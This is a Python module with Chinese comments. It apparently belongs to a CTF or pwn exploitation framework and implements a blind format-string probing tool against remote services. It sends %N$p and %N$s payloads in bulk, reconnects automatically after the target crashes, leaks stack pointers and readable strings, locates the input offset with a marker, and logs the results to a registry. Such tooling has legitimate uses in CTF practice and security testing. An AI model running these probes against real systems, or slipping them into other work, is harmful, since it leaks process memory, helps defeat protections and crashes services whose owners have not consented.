"""Blind FMT 探测插件。

该模块不依赖本地 ELF，适合纯远程盲打场景：
- 自动重连
- `%p/%s` 批量探测
- 自动定位输入 offset
- 探测结果同步写入 Registry
"""

from __future__ import annotations

import re
import time
from typing import Callable, Protocol

from .._compat import context, log
from ..core.registry import PwnRegistry, RecordKind, RecordSource
from ..core.target import TubeLike


class InteractFunc(Protocol):
    """盲打交互函数协议。"""

    def __call__(self, io_obj: TubeLike, payload: bytes) -> bytes | None:
        ...


class BlindFmtTool:
    """面向格式化字符串盲打的工具类。"""

    def __init__(
        self,
        io_factory: Callable[[], TubeLike],
        interact_func: InteractFunc,
        registry: PwnRegistry | None = None,
        arch: int = 64,
        delay: float = 0.10,
        timeout: float = 2.0,
    ) -> None:
        """创建 blind 探测器。"""
        self.io_factory = io_factory
        self.interact_func = interact_func
        self.registry = registry
        self.arch = arch
        self.delay = delay
        self.timeout = timeout

        self.current_io: TubeLike | None = None
        self.offset: int = -1

        self._ensure_connection()

    @property
    def offest(self) -> int:
        """兼容历史拼写错误 `offest`，统一映射到 `offset`。"""
        return self.offset

    @offest.setter
    def offest(self, value: int) -> None:
        """兼容历史拼写错误 `offest`，统一映射到 `offset`。"""
        self.offset = value

    def _ensure_connection(self) -> TubeLike:
        """确保当前存在可用连接；断开时自动重建。"""
        if self.current_io is None:
            self.current_io = self.io_factory()
            if hasattr(self.current_io, "timeout"):
                self.current_io.timeout = self.timeout
        return self.current_io

    def _safe_interact(self, payload: bytes) -> bytes | None:
        """安全执行一次交互，崩溃/断线时自动回收并等待重连。"""
        io_obj = self._ensure_connection()
        time.sleep(self.delay)

        try:
            result = self.interact_func(io_obj, payload)
            if result is None:
                raise EOFError("interact 回调返回 None")
            return result
        except (EOFError, BrokenPipeError, ConnectionResetError):
            log.warning(
                f"Payload [{payload.decode(errors='ignore')}] 导致崩溃或断线，准备重连..."
            )
            if self.current_io and hasattr(self.current_io, "close"):
                self.current_io.close()
            self.current_io = None
            return None
        except Exception as exc:
            log.error(f"盲打交互出现异常：{exc}")
            return None

    @staticmethod
    def _extract_pointer(raw_text: str) -> int | None:
        """从返回文本中提取首个十六进制地址。"""
        match = re.search(r"0x[0-9a-fA-F]+", raw_text)
        if not match:
            return None
        try:
            return int(match.group(0), 16)
        except ValueError:
            return None

    @staticmethod
    def _is_offset_hit(raw_text: str) -> bool:
        """判断是否命中输入偏移的常见特征（`0x2425` / `0x7024`）。"""
        cleaned = raw_text.lower().replace("0x", "")
        return "2425" in cleaned or "7024" in cleaned

    def dump_stack_ptrs(
        self,
        start_idx: int = 1,
        end_idx: int = 50,
        fast: bool = True,
        record_hits: bool = True,
    ) -> dict[int, str]:
        """批量探测 ``%<idx>$p``，返回每个下标的原始文本。"""
        log.info(
            f"开始扫栈指针：%{start_idx}$p .. %{end_idx}$p | 模式={'快速' if fast else '安全'}"
        )

        results: dict[int, str] = {}
        self.offset = -1
        original_delay = self.delay
        if fast:
            self.delay = 0.0

        try:
            for index in range(start_idx, end_idx + 1):
                payload = f"%{index}$p".encode()
                response = self._safe_interact(payload)

                if response is None:
                    results[index] = "<Crash!>"
                    print(f"[{index:02d}] <Crash!>")
                    continue

                clean_text = response.decode(errors="ignore").strip()
                results[index] = clean_text

                pointer = self._extract_pointer(clean_text)
                if record_hits and pointer is not None and self.registry is not None:
                    self.registry.add_address(
                        name=f"fmt.stack.{index}",
                        value=pointer,
                        kind=RecordKind.STACK_PTR,
                        source=RecordSource.BLIND_FMT,
                        confidence=0.45,
                        notes="Blind FMT `%p` 扫描命中",
                        meta={"index": index, "payload": payload.decode()},
                    )

                if self._is_offset_hit(clean_text):
                    self.offset = index
                    print(
                        f" \033[1;32m[!] 命中 Offset -> %{index}$p ({clean_text})\033[0m"
                    )
                    if self.registry is not None:
                        self.registry.add_address(
                            name="fmt.input_offset",
                            value=index,
                            kind=RecordKind.FMT_OFFSET_HIT,
                            source=RecordSource.BLIND_FMT,
                            confidence=0.90,
                            notes="通过 0x2425/0x7024 特征识别 offset",
                            meta={"response": clean_text},
                        )
                else:
                    if str(getattr(context, "log_level", "")).upper() != "DEBUG":
                        print(f"[{index:02d}] {clean_text}")

            if self.offset != -1:
                log.success(f"栈扫完成，确认输入偏移 offset = {self.offset}")
            else:
                log.warning("栈扫完成，但未找到可靠 offset。")
            return results
        finally:
            self.delay = original_delay

    def dump_strings(self, start_idx: int = 1, end_idx: int = 50) -> dict[int, bytes]:
        """批量探测 ``%<idx>$s``，用于盲猜可读字符串。"""
        log.info(f"开始扫字符串：%{start_idx}$s .. %{end_idx}$s")
        results: dict[int, bytes] = {}

        for index in range(start_idx, end_idx + 1):
            payload = f"%{index}$s".encode()
            response = self._safe_interact(payload)

            if response is None:
                log.debug(f"Index {index}: 指针不可读导致崩溃（盲打中属正常现象）")
                continue

            results[index] = response
            decoded = response.decode(errors="ignore")
            log.success(f"Index {index} 命中字串：{decoded}")

            if self.registry is not None:
                self.registry.add_log(**{f"fmt.string.{index}": decoded})

        return results

    def find_input_offset(self, marker: bytes = b"PwnTool", max_range: int = 30) -> int:
        """通过 marker 回显定位输入在栈参数中的 offset。"""
        marker_text = marker.decode(errors="ignore")
        log.info(f"开始查找输入 offset，marker = {marker_text}")
        marker_hex_little_endian = marker[::-1].hex()

        for index in range(1, max_range + 1):
            payload = marker + b"|%" + str(index).encode() + b"$p"
            response = self._safe_interact(payload)
            if response is None:
                continue

            response_text = response.decode(errors="ignore").lower().replace("0x", "")
            if marker_hex_little_endian in response_text:
                self.offset = index
                log.success(f"找到输入 offset = {index}")
                if self.registry is not None:
                    self.registry.add_address(
                        name="fmt.input_offset",
                        value=index,
                        kind=RecordKind.FMT_OFFSET_HIT,
                        source=RecordSource.BLIND_FMT,
                        confidence=0.95,
                        notes="在 `%p` 输出中匹配到小端 marker",
                        meta={"marker": marker_text},
                    )
                return index

        log.warning("在给定范围内未找到输入 offset。")
        return -1

    def close(self) -> None:
        """关闭当前 IO 连接（若存在）。"""
        if self.current_io is not None and hasattr(self.current_io, "close"):
            self.current_io.close()
            self.current_io = None


Blind = BlindFmtTool


__all__ = ["Blind", "BlindFmtTool", "InteractFunc"]
